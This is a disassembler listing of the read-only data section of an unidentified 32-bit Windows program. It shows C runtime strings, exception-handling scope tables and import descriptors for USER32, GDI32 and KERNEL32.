aFloor		db 'floor',0            ; DATA XREF: ___libm_error_support:loc_41D5CCo
		align 4
aCeil		db 'ceil',0             ; DATA XREF: ___libm_error_support:loc_41D5C3o
		align 4
aAtan		db 'atan',0             ; DATA XREF: ___libm_error_support:loc_41D5BAo
		align 4
aExp10		db 'exp10',0            ; DATA XREF: ___libm_error_support+1C1o
		align 4
aAcos		db 'acos',0             ; DATA XREF: ___libm_error_support:loc_41D541o
		align 4
aAsin		db 'asin',0             ; DATA XREF: ___libm_error_support:loc_41D538o
		align 4
aLog		db 'log',0              ; DATA XREF: ___libm_error_support:loc_41D4FBo
					; ___libm_error_support+14Bo ...
aLog10		db 'log10',0            ; DATA XREF: ___libm_error_support:loc_41D4D4o
					; ___libm_error_support+133o ...
		align 4
aExp		db 'exp',0              ; DATA XREF: ___libm_error_support:loc_41D49Bo
					; ___libm_error_support+10Fo ...
aPow		db 'pow',0              ; DATA XREF: ___libm_error_support:loc_41D466o
					; ___libm_error_support:loc_41D513o ...
; CHAR aGetprocesswind[]
aGetprocesswind	db 'GetProcessWindowStation',0 ; DATA XREF: sub_41EADF+9Do
; CHAR aGetuserobjecti[]
aGetuserobjecti	db 'GetUserObjectInformationA',0 ; DATA XREF: sub_41EADF+7Eo
		align 4
; CHAR aGetlastactivep[]
aGetlastactivep	db 'GetLastActivePopup',0 ; DATA XREF: sub_41EADF+69o
		align 4
; CHAR aGetactivewindo[]
aGetactivewindo	db 'GetActiveWindow',0  ; DATA XREF: sub_41EADF+54o
; CHAR aMessageboxa[]
aMessageboxa	db 'MessageBoxA',0      ; DATA XREF: sub_41EADF+3Eo
; CHAR LibFileName[]
LibFileName	db 'USER32.DLL',0       ; DATA XREF: sub_41EADF+23o
		align 10h
; const	WCHAR SrcStr
SrcStr		dw 0			; DATA XREF: __crtLCMapStringA_stat(localeinfo_struct *,ulong,ulong,char const *,int,char *,int,int,int)+27o
					; __crtGetStringTypeA_stat(localeinfo_struct *,ulong,char const	*,int,ushort *,int,int,int)+29o
		align 4
		dd 41h dup(0)
asc_429DD8:				; DATA XREF: .data:off_430998o
					; .data:00430B58o
		unicode	0, <	     (((((		    H>
		dw 10h
		dd 7 dup(100010h), 5 dup(840084h), 3 dup(100010h), 810010h
		dd 2 dup(810081h), 10081h, 9 dup(10001h), 100001h, 2 dup(100010h)
		dd 820010h, 2 dup(820082h), 20082h, 9 dup(20002h), 100002h
		dd 100010h, 200010h, 40h dup(0)
dword_429FD8	dd 200000h, 4 dup(200020h), 280068h, 280028h, 200028h
					; DATA XREF: .data:00430B5Co
					; .data:004308C0o
		dd 8 dup(200020h), 480020h, 7 dup(100010h), 840010h, 4 dup(840084h)
		dd 100084h, 3 dup(100010h), 3 dup(1810181h), 0Ah dup(1010101h)
		dd 3 dup(100010h), 3 dup(1820182h), 0Ah	dup(1020102h)
		dd 2 dup(100010h), 10h dup(200020h), 480020h, 8	dup(100010h)
		dd 140010h, 100014h, 2 dup(100010h), 100014h, 2	dup(100010h)
		dd 1010010h, 0Bh dup(1010101h),	1010010h, 3 dup(1010101h)
		dd 0Ch dup(1020102h), 1020010h,	3 dup(1020102h), 1010102h
		dd 0
dword_42A1E0	dd 83828180h, 87868584h, 8B8A8988h, 8F8E8D8Ch, 93929190h
		dd 97969594h, 9B9A9998h, 9F9E9D9Ch, 0A3A2A1A0h,	0A7A6A5A4h
		dd 0ABAAA9A8h, 0AFAEADACh, 0B3B2B1B0h, 0B7B6B5B4h, 0BBBAB9B8h
		dd 0BFBEBDBCh, 0C3C2C1C0h, 0C7C6C5C4h, 0CBCAC9C8h, 0CFCECDCCh
		dd 0D3D2D1D0h, 0D7D6D5D4h, 0DBDAD9D8h, 0DFDEDDDCh, 0E3E2E1E0h
		dd 0E7E6E5E4h, 0EBEAE9E8h, 0EFEEEDECh, 0F3F2F1F0h, 0F7F6F5F4h
		dd 0FBFAF9F8h, 0FFFEFDFCh, 3020100h, 7060504h, 0B0A0908h
		dd 0F0E0D0Ch, 13121110h, 17161514h, 1B1A1918h, 1F1E1D1Ch
		dd 23222120h, 27262524h, 2B2A2928h, 2F2E2D2Ch, 33323130h
		dd 37363534h, 3B3A3938h, 3F3E3D3Ch, 63626140h, 67666564h
		dd 6B6A6968h, 6F6E6D6Ch, 73727170h, 77767574h, 5B7A7978h
		dd 5F5E5D5Ch, 63626160h, 67666564h, 6B6A6968h, 6F6E6D6Ch
		dd 73727170h, 77767574h, 7B7A7978h, 7F7E7D7Ch, 83828180h
		dd 87868584h, 8B8A8988h, 8F8E8D8Ch, 93929190h, 97969594h
		dd 9B9A9998h, 9F9E9D9Ch, 0A3A2A1A0h, 0A7A6A5A4h, 0ABAAA9A8h
		dd 0AFAEADACh, 0B3B2B1B0h, 0B7B6B5B4h, 0BBBAB9B8h, 0BFBEBDBCh
		dd 0C3C2C1C0h, 0C7C6C5C4h, 0CBCAC9C8h, 0CFCECDCCh, 0D3D2D1D0h
		dd 0D7D6D5D4h, 0DBDAD9D8h, 0DFDEDDDCh, 0E3E2E1E0h, 0E7E6E5E4h
		dd 0EBEAE9E8h, 0EFEEEDECh, 0F3F2F1F0h, 0F7F6F5F4h, 0FBFAF9F8h
		dd 0FFFEFDFCh, 83828180h, 87868584h, 8B8A8988h,	8F8E8D8Ch
		dd 93929190h, 97969594h, 9B9A9998h, 9F9E9D9Ch, 0A3A2A1A0h
		dd 0A7A6A5A4h, 0ABAAA9A8h, 0AFAEADACh, 0B3B2B1B0h, 0B7B6B5B4h
		dd 0BBBAB9B8h, 0BFBEBDBCh, 0C3C2C1C0h, 0C7C6C5C4h, 0CBCAC9C8h
		dd 0CFCECDCCh, 0D3D2D1D0h, 0D7D6D5D4h, 0DBDAD9D8h, 0DFDEDDDCh
		dd 0E3E2E1E0h, 0E7E6E5E4h, 0EBEAE9E8h, 0EFEEEDECh, 0F3F2F1F0h
		dd 0F7F6F5F4h, 0FBFAF9F8h, 0FFFEFDFCh, 3020100h, 7060504h
		dd 0B0A0908h, 0F0E0D0Ch, 13121110h, 17161514h, 1B1A1918h
		dd 1F1E1D1Ch, 23222120h, 27262524h, 2B2A2928h, 2F2E2D2Ch
		dd 33323130h, 37363534h, 3B3A3938h, 3F3E3D3Ch, 43424140h
		dd 47464544h, 4B4A4948h, 4F4E4D4Ch, 53525150h, 57565554h
		dd 5B5A5958h, 5F5E5D5Ch, 43424160h, 47464544h, 4B4A4948h
		dd 4F4E4D4Ch, 53525150h, 57565554h, 7B5A5958h, 7F7E7D7Ch
		dd 83828180h, 87868584h, 8B8A8988h, 8F8E8D8Ch, 93929190h
		dd 97969594h, 9B9A9998h, 9F9E9D9Ch, 0A3A2A1A0h,	0A7A6A5A4h
		dd 0ABAAA9A8h, 0AFAEADACh, 0B3B2B1B0h, 0B7B6B5B4h, 0BBBAB9B8h
		dd 0BFBEBDBCh, 0C3C2C1C0h, 0C7C6C5C4h, 0CBCAC9C8h, 0CFCECDCCh
		dd 0D3D2D1D0h, 0D7D6D5D4h, 0DBDAD9D8h, 0DFDEDDDCh, 0E3E2E1E0h
		dd 0E7E6E5E4h, 0EBEAE9E8h, 0EFEEEDECh, 0F3F2F1F0h, 0F7F6F5F4h
		dd 0FBFAF9F8h, 0FFFEFDFCh, 6D3A4848h, 73733A6Dh, 0
aDdddMmmmDdYyyy	db 'dddd, MMMM dd, yyyy',0 ; DATA XREF: .data:00430C04o
aMmDdYy		db 'MM/dd/yy',0         ; DATA XREF: .data:00430C00o
		align 4
aPm		db 'PM',0               ; DATA XREF: .data:00430BFCo
		align 10h
aAm		db 'AM',0               ; DATA XREF: .data:00430BF8o
		align 4
aDecember	db 'December',0         ; DATA XREF: .data:00430BF4o
		align 10h
aNovember	db 'November',0         ; DATA XREF: .data:00430BF0o
		align 4
aOctober	db 'October',0          ; DATA XREF: .data:00430BECo
aSeptember	db 'September',0        ; DATA XREF: .data:00430BE8o
		align 10h
aAugust		db 'August',0           ; DATA XREF: .data:00430BE4o
		align 4
aJuly		db 'July',0             ; DATA XREF: .data:00430BE0o
		align 10h
aJune		db 'June',0             ; DATA XREF: .data:00430BDCo
		align 4
aApril		db 'April',0            ; DATA XREF: .data:00430BD4o
		align 10h
aMarch		db 'March',0            ; DATA XREF: .data:00430BD0o
		align 4
aFebruary	db 'February',0         ; DATA XREF: .data:00430BCCo
		align 4
aJanuary	db 'January',0          ; DATA XREF: .data:00430BC8o
aDec		db 'Dec',0              ; DATA XREF: .data:00430BC4o
aNov		db 'Nov',0              ; DATA XREF: .data:00430BC0o
aOct		db 'Oct',0              ; DATA XREF: .data:00430BBCo
aSep		db 'Sep',0              ; DATA XREF: .data:00430BB8o
aAug		db 'Aug',0              ; DATA XREF: .data:00430BB4o
aJul		db 'Jul',0              ; DATA XREF: .data:00430BB0o
aJun		db 'Jun',0              ; DATA XREF: .data:00430BACo
aMay		db 'May',0              ; DATA XREF: .data:00430BA8o
					; .data:00430BD8o
aApr		db 'Apr',0              ; DATA XREF: .data:00430BA4o
aMar		db 'Mar',0              ; DATA XREF: .data:00430BA0o
aFeb		db 'Feb',0              ; DATA XREF: .data:00430B9Co
aJan		db 'Jan',0              ; DATA XREF: .data:00430B98o
aSaturday	db 'Saturday',0         ; DATA XREF: .data:00430B94o
		align 4
aFriday		db 'Friday',0           ; DATA XREF: .data:00430B90o
		align 10h
aThursday	db 'Thursday',0         ; DATA XREF: .data:00430B8Co
		align 4
aWednesday	db 'Wednesday',0        ; DATA XREF: .data:00430B88o
		align 4
aTuesday	db 'Tuesday',0          ; DATA XREF: .data:00430B84o
aMonday		db 'Monday',0           ; DATA XREF: .data:00430B80o
		align 4
aSunday		db 'Sunday',0           ; DATA XREF: .data:00430B7Co
		align 10h
aSat		db 'Sat',0              ; DATA XREF: .data:00430B78o
aFri		db 'Fri',0              ; DATA XREF: .data:00430B74o
aThu		db 'Thu',0              ; DATA XREF: .data:00430B70o
aWed		db 'Wed',0              ; DATA XREF: .data:00430B6Co
aTue		db 'Tue',0              ; DATA XREF: .data:00430B68o
aMon		db 'Mon',0              ; DATA XREF: .data:00430B64o
aSun		db 'Sun',0              ; DATA XREF: .data:off_430B60o
; char a1Qnan[]
a1Qnan		db '1#QNAN',0           ; DATA XREF: _$I10_OUTPUT:loc_420B6Eo
		align 4
; char a1Inf[]
a1Inf		db '1#INF',0            ; DATA XREF: _$I10_OUTPUT+10Ao
		align 4
a1Ind		db '1#IND',0            ; DATA XREF: _$I10_OUTPUT+FBo
		align 4
a1Snan		db '1#SNAN',0           ; DATA XREF: _$I10_OUTPUT+E3o
		align 4
; struct _EXCEPTION_POINTERS ExceptionInfo
ExceptionInfo	_EXCEPTION_POINTERS <offset dword_44EBB0, offset dword_44EC08>
					; DATA XREF: ___report_gsfailure+D6o
a_nextafter	db '_nextafter',0
		align 10h
a_logb		db '_logb',0
		align 4
a_yn		db '_yn',0
a_y1		db '_y1',0
a_y0		db '_y0',0
aFrexp		db 'frexp',0
		align 4
aFmod		db 'fmod',0
		align 4
a_hypot		db '_hypot',0
		align 4
a_cabs		db '_cabs',0
		align 4
aLdexp		db 'ldexp',0
		align 4
aFabs		db 'fabs',0
		align 4
aSqrt		db 'sqrt',0
		align 4
aAtan2		db 'atan2',0
		align 4
aTanh		db 'tanh',0
		align 4
aCosh		db 'cosh',0
		align 4
aSinh		db 'sinh',0
		align 4
aSunmontuewedth	db 'SunMonTueWedThuFriSat',0
		align 4
aJanfebmaraprma	db 'JanFebMarAprMayJunJulAugSepOctNovDec',0
		align 10h
__load_config_used dd 48h		; Size
		dd 0			; Time stamp
		dw 2 dup(0)		; Version: 0.0
		dd 0			; GlobalFlagsClear
		dd 0			; GlobalFlagsSet
		dd 0			; CriticalSectionDefaultTimeout
		dd 0			; DeCommitFreeBlockThreshold
		dd 0			; DeCommitTotalFreeThreshold
		dd 0			; LockPrefixTable
		dd 0			; MaximumAllocationSize
		dd 0			; VirtualMemoryThreshold
		dd 0			; ProcessAffinityMask
		dd 0			; ProcessHeapFlags
		dw 0			; CSDVersion
		dw 0			; Reserved1
		dd 0			; EditList
		dd offset ___security_cookie ; SecurityCookie
		dd offset ___safe_se_handler_table ; SEHandlerTable
		dd 3			; SEHandlerCount
		align 10h
___safe_se_handler_table dd rva	__except_handler4 ; DATA XREF: .rdata:0042A730o
		dd rva __unwind_handler4
		dd rva __unwind_handler
		align 10h
dword_42A750	dd 2 dup(0)		; DATA XREF: sub_41AFFF+3o
					; sub_41AFFF+8o
dword_42A758	dd 2 dup(0)		; DATA XREF: sub_41B025+3o
					; sub_41B025+8o
stru_42A760	dd 0FFFFFFFEh		; GSCookieOffset ; DATA	XREF: _realloc+2o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 415E4B
		dd 0FFFFFFD0h		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd 0			; ScopeRecord.FilterFunc
		dd offset loc_415F89	; ScopeRecord.HandlerFunc
		align 10h
stru_42A780	dd 0FFFFFFFEh		; GSCookieOffset ; DATA	XREF: ___tmainCRTStartup+2o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 4165B4
		dd 0FFFFFF88h		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd offset $LN35		; ScopeRecord.FilterFunc
		dd offset $LN17		; ScopeRecord.HandlerFunc
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd offset $LN34		; ScopeRecord.FilterFunc
		dd offset $LN21		; ScopeRecord.HandlerFunc
stru_42A7A8	dd 0FFFFFFFEh		; GSCookieOffset ; DATA	XREF: __mtinitlocknum+2o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 417496
		dd 0FFFFFFD4h		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd 0			; ScopeRecord.FilterFunc
		dd offset loc_417550	; ScopeRecord.HandlerFunc
		align 8
stru_42A7C8	dd 0FFFFFFFEh		; GSCookieOffset ; DATA	XREF: _free+2o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 4183E5
		dd 0FFFFFFD4h		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd 0			; ScopeRecord.FilterFunc
		dd offset loc_41843B	; ScopeRecord.HandlerFunc
		align 8
stru_42A7E8	dd 0FFFFFFFEh		; GSCookieOffset ; DATA	XREF: _V6_HeapAlloc+2o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 418473
		dd 0FFFFFFD4h		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd 0			; ScopeRecord.FilterFunc
		dd offset loc_4184B9	; ScopeRecord.HandlerFunc
		align 8
stru_42A808	dd 0FFFFFFFEh		; GSCookieOffset ; DATA	XREF: _doexit+2o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 41A3DA
		dd 0FFFFFFC8h		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd 0			; ScopeRecord.FilterFunc
		dd offset loc_41A4EE	; ScopeRecord.HandlerFunc
		align 8
stru_42A828	dd 0FFFFFFFEh		; GSCookieOffset ; DATA	XREF: __ioinit+2o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 41ADAB
		dd 0FFFFFF8Ch		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd offset loc_41AFE8	; ScopeRecord.FilterFunc
		dd offset loc_41AFEC	; ScopeRecord.HandlerFunc
		align 8
stru_42A848	dd 0FFFFFFFEh		; GSCookieOffset ; DATA	XREF: __initptd+2o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 41B1B2
		dd 0FFFFFFD4h		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd 0			; ScopeRecord.FilterFunc
		dd offset loc_41B281	; ScopeRecord.HandlerFunc
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd 0			; ScopeRecord.FilterFunc
		dd offset loc_41B290	; ScopeRecord.HandlerFunc
stru_42A870	dd 0FFFFFFFEh		; GSCookieOffset ; DATA	XREF: _freefls(x)+2o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 41B32C
		dd 0FFFFFFD8h		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd 0			; ScopeRecord.FilterFunc
		dd offset loc_41B443	; ScopeRecord.HandlerFunc
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd 0			; ScopeRecord.FilterFunc
		dd offset loc_41B44F	; ScopeRecord.HandlerFunc
stru_42A898	dd 0FFFFFFFEh		; GSCookieOffset ; DATA	XREF: ___updatetmbcinfo+2o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 41B8D3
		dd 0FFFFFFD4h		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd 0			; ScopeRecord.FilterFunc
		dd offset loc_41B96B	; ScopeRecord.HandlerFunc
		align 8
stru_42A8B8	dd 0FFFFFFFEh		; GSCookieOffset ; DATA	XREF: __setmbcp+2o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 41BBD8
		dd 0FFFFFFCCh		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd 0			; ScopeRecord.FilterFunc
		dd offset loc_41BD39	; ScopeRecord.HandlerFunc
		align 8
stru_42A8D8	dd 0FFFFFFFEh		; GSCookieOffset ; DATA	XREF: ___updatetlocinfo+2o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 41C03F
		dd 0FFFFFFD4h		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd 0			; ScopeRecord.FilterFunc
		dd offset loc_41C0A9	; ScopeRecord.HandlerFunc
		align 8
stru_42A8F8	dd 0FFFFFFFEh		; GSCookieOffset
					; DATA XREF: ___crtInitCritSecAndSpinCount+2o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 41CDB3
		dd 0FFFFFFD0h		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd offset loc_41CDD4	; ScopeRecord.FilterFunc
		dd offset loc_41CDEB	; ScopeRecord.HandlerFunc
		align 8
stru_42A918	dd 0FFFFFFFEh		; GSCookieOffset
					; DATA XREF: __IsNonwritableInCurrentImage+7o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 41D240
		dd 0FFFFFFD8h		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd offset loc_41D2CB	; ScopeRecord.FilterFunc
		dd offset loc_41D2DF	; ScopeRecord.HandlerFunc
		align 8
stru_42A938	dd 0FFFFFFFEh		; GSCookieOffset ; DATA	XREF: _has_osfxsr_set+2o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 41D2FD
		dd 0FFFFFFD4h		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd offset loc_41D31A	; ScopeRecord.FilterFunc
		dd offset loc_41D336	; ScopeRecord.HandlerFunc
		align 8
stru_42A958	dd 0FFFFFFFEh		; GSCookieOffset ; DATA	XREF: terminate(void)+2o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 41E727
		dd 0FFFFFFD8h		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd offset loc_41E747	; ScopeRecord.FilterFunc
		dd offset loc_41E74B	; ScopeRecord.HandlerFunc
		align 8
stru_42A978	dd 0FFFFFFFEh		; GSCookieOffset ; DATA	XREF: __onexit+2o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 41E85C
		dd 0FFFFFFD4h		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd 0			; ScopeRecord.FilterFunc
		dd offset loc_41E892	; ScopeRecord.HandlerFunc
		align 8
stru_42A998	dd 0FFFFFFFEh		; GSCookieOffset ; DATA	XREF: _raise+2o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 41E911
		dd 0FFFFFFC0h		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd 0			; ScopeRecord.FilterFunc
		dd offset loc_41EA7F	; ScopeRecord.HandlerFunc
		align 8
stru_42A9B8	dd 0FFFFFFFEh		; GSCookieOffset ; DATA	XREF: __calloc_impl+2o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 421985
		dd 0FFFFFFD4h		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd 0			; ScopeRecord.FilterFunc
		dd offset loc_421A7C	; ScopeRecord.HandlerFunc
		align 8
stru_42A9D8	dd 0FFFFFFFEh		; GSCookieOffset ; DATA	XREF: ___set_fpsr_sse2+2o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 42218E
		dd 0FFFFFFD8h		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd offset loc_4221BB	; ScopeRecord.FilterFunc
		dd offset loc_4221D7	; ScopeRecord.HandlerFunc
		align 8
stru_42A9F8	dd 0FFFFFFFEh		; GSCookieOffset ; DATA	XREF: __msize+2o
		dd 0			; GSCookieXOROffset ; SEH scope	table for function 422317
		dd 0FFFFFFD0h		; EHCookieOffset
		dd 0			; EHCookieXOROffset
		dd 0FFFFFFFEh		; ScopeRecord.EnclosingLevel
		dd 0			; ScopeRecord.FilterFunc
		dd offset loc_4223A9	; ScopeRecord.HandlerFunc
__IMPORT_DESCRIPTOR_USER32 dd rva off_42AD74 ; Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aUser32_dll	; DLL Name
		dd rva GetAsyncKeyState	; Import Address Table
__IMPORT_DESCRIPTOR_GDI32 dd rva off_42AA64 ; Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aGdi32_dll	; DLL Name
		dd rva FillRgn		; Import Address Table
__IMPORT_DESCRIPTOR_KERNEL32 dd	rva off_42AAE0 ; Import	Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aKernel32_dll	; DLL Name
		dd rva SetEvent		; Import Address Table
		dd 5 dup(0)
;
; Import names for GDI32.dll
;
off_42AA64	dd rva word_42B3CE	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_GDI32o
		dd rva word_42B3C0
		dd rva word_42B3AE
		dd rva word_42B3A4
		dd rva word_42B392
		dd rva word_42B380
		dd rva word_42B36E
		dd rva word_42B35A
		dd rva word_42B34E
		dd rva word_42B33C
		dd rva word_42B332
		dd rva word_42B31E
		dd rva word_42B30C
		dd rva word_42B2FC
		dd rva word_42B2EC
		dd rva word_42B2D0
		dd rva word_42B2C6
		dd rva word_42B2AC
		dd rva word_42B29A
		dd rva word_42B28C
		dd rva word_42B278
		dd rva word_42B26C
		dd rva word_42B25C
		dd rva word_42B23E
		dd rva word_42B226
		dd rva word_42B21C
		dd rva word_42B208
		dd rva word_42B1F8
		dd rva word_42B1EC
		dd rva word_42B3D8
		dd 0
;
; Import names for KERNEL32.dll
;
off_42AAE0	dd rva word_42BE64	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_KERNEL32o
		dd rva word_42BE52
		dd rva word_42BE46
		dd rva word_42BE34
		dd rva word_42BE1A
		dd rva word_42BE04
		dd rva word_42BDF4
		dd rva word_42BDE6
		dd rva word_42BDD4
		dd rva word_42BDC0
		dd rva word_42BDB2
		dd rva word_42BE70
		dd rva word_42BD88
		dd rva word_42BD7A
		dd rva word_42BD6A
		dd rva word_42BD50
		dd rva word_42BD36
		dd rva word_42BD28
		dd rva word_42BD18
		dd rva word_42BD00
		dd rva word_42BCE6
		dd rva word_42BCCE
		dd rva word_42BCC0
		dd rva word_42BE88
		dd rva word_42BEA0
		dd rva word_42BEB8
		dd rva word_42BEC8
		dd rva word_42BEE4
		dd rva word_42BEFA
		dd rva word_42BF02
		dd rva word_42BF14
		dd rva word_42BF22
		dd rva word_42BF32
		dd rva word_42BF4C
		dd rva word_42BF64
		dd rva word_42BF7C
		dd rva word_42BF94
		dd rva word_42BFA4
		dd rva word_42BFB6
		dd rva word_42BDA2
		dd rva word_42B726
		dd rva word_42B3F6
		dd rva word_42B40A
		dd rva word_42B41A
		dd rva word_42B43A
		dd rva word_42B448
		dd rva word_42B466
		dd rva word_42B474
		dd rva word_42B486
		dd rva word_42B498
		dd rva word_42B4AC
		dd rva word_42B4C0
		dd rva word_42B4D8
		dd rva word_42B4E4
		dd rva word_42B4F2
		dd rva word_42B504
		dd rva word_42B514
		dd rva word_42B520
		dd rva word_42B532
		dd rva word_42B548
		dd rva word_42B554
		dd rva word_42B560
		dd rva word_42B56A
		dd rva word_42B576
		dd rva word_42B58C
		dd rva word_42B5A8
		dd rva word_42B5C6
		dd rva word_42B5D4
		dd rva word_42B5E6
		dd rva word_42B5FA
		dd rva word_42B608
		dd rva word_42B61E
		dd rva word_42B634
		dd rva word_42B642
		dd rva word_42B65E
		dd rva word_42B66A
		dd rva word_42B676
		dd rva word_42B682
		dd rva word_42B696
		dd rva word_42B6A2
		dd rva word_42B6B0
		dd rva word_42B6C6
		dd rva word_42B6D6
		dd rva word_42B6E2
		dd rva word_42B6F0
		dd rva word_42B704
		dd rva word_42B714
		dd rva word_42B732
		dd rva word_42B746
		dd rva word_42B752
		dd rva word_42B764
		dd rva word_42B774
		dd rva word_42B784
		dd rva word_42B792
		dd rva word_42B7A2
		dd rva word_42B7B6
		dd rva word_42B7C2
		dd rva word_42B7CE
		dd rva word_42B7DC
		dd rva word_42B7EC
		dd rva word_42B7FE
		dd rva word_42B80E
		dd rva word_42B826
		dd rva word_42B834
		dd rva word_42B840
		dd rva word_42B854
		dd rva word_42B86A
		dd rva word_42B87C
		dd rva word_42B88E
		dd rva word_42B8A6
		dd rva word_42B8BE
		dd rva word_42B8D4
		dd rva word_42B8F6
		dd rva word_42B910
		dd rva word_42B920
		dd rva word_42B932
		dd rva word_42B946
		dd rva word_42B956
		dd rva word_42B964
		dd rva word_42B978
		dd rva word_42B988
		dd rva word_42B998
		dd rva word_42B9B4
		dd rva word_42B9C2
		dd rva word_42B9CE
		dd rva word_42B9E0
		dd rva word_42B9F2
		dd rva word_42BA02
		dd rva word_42BA0E
		dd rva word_42BA1E
		dd rva word_42BA2A
		dd rva word_42BA3C
		dd rva word_42BA48
		dd rva word_42BA52
		dd rva word_42BA5E
		dd rva word_42BA6A
		dd rva word_42BA7E
		dd rva word_42BA9A
		dd rva word_42BAAE
		dd rva word_42BAC8
		dd rva word_42BADE
		dd rva word_42BAF8
		dd rva word_42BB06
		dd rva word_42BB1C
		dd rva word_42BB2C
		dd rva word_42BB36
		dd rva word_42BB44
		dd rva word_42BB52
		dd rva word_42BB5E
		dd rva word_42BB6C
		dd rva word_42BB94
		dd rva word_42BBA6
		dd rva word_42BBC0
		dd rva word_42BBDA
		dd rva word_42BBF0
		dd rva word_42BC00
		dd rva word_42BC1E
		dd rva word_42BC30
		dd rva word_42BC46
		dd rva word_42BC58
		dd rva word_42BC6C
		dd rva word_42BC7E
		dd rva word_42BC8E
		dd rva word_42BCA6
		dd 0
;
; Import names for USER32.dll
;
off_42AD74	dd rva word_42B1CC	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_USER32o
		dd rva word_42B1B6
		dd rva word_42B1A4
		dd rva word_42B194
		dd rva word_42B182
		dd rva word_42B170
		dd rva word_42B162
		dd rva word_42B150
		dd rva word_42B13C
		dd rva word_42B12A
		dd rva word_42B118
		dd rva word_42B108
		dd rva word_42B0FA
		dd rva word_42B0E8
		dd rva word_42B0D4
		dd rva word_42B0C8
		dd rva word_42B0B6
		dd rva word_42B0A6
		dd rva word_42B096
		dd rva word_42B084
		dd rva word_42B074
		dd rva word_42B062
		dd rva word_42B050
		dd rva word_42B03E
		dd rva word_42B026
		dd rva word_42B014
		dd rva word_42B002
		dd rva word_42AFF0
		dd rva word_42AFDA
		dd rva word_42AFCE
		dd rva word_42AFC0
		dd rva word_42AFB4
		dd rva word_42AFA6
		dd rva word_42AF92
		dd rva word_42AF82
		dd rva word_42AF76
		dd rva word_42AF64
		dd rva word_42AF52
		dd rva word_42AF3C
		dd rva word_42AF2E
		dd rva word_42AF1E
		dd rva word_42AF0A
		dd rva word_42AEFC
		dd rva word_42AEEC
		dd rva word_42AED6
		dd rva word_42AEC2
		dd rva word_42AEBA
		dd rva word_42AEA0
		dd rva word_42AE94
		dd rva word_42AE84
		dd rva word_42AE70
		dd rva word_42AE5C
		dd rva word_42AE4C
		dd 0
word_42AE4C	dw 1C7h			; DATA XREF: .rdata:0042AE44o
		db 'IsCharUpperA',0
		align 4
word_42AE5C	dw 22Ah			; DATA XREF: .rdata:0042AE40o
		db 'OpenInputDesktop',0
		align 10h
word_42AE70	dw 21Ah			; DATA XREF: .rdata:0042AE3Co
		db 'MonitorFromWindow',0
word_42AE84	dw 226h			; DATA XREF: .rdata:0042AE38o
		db 'OpenClipboard',0
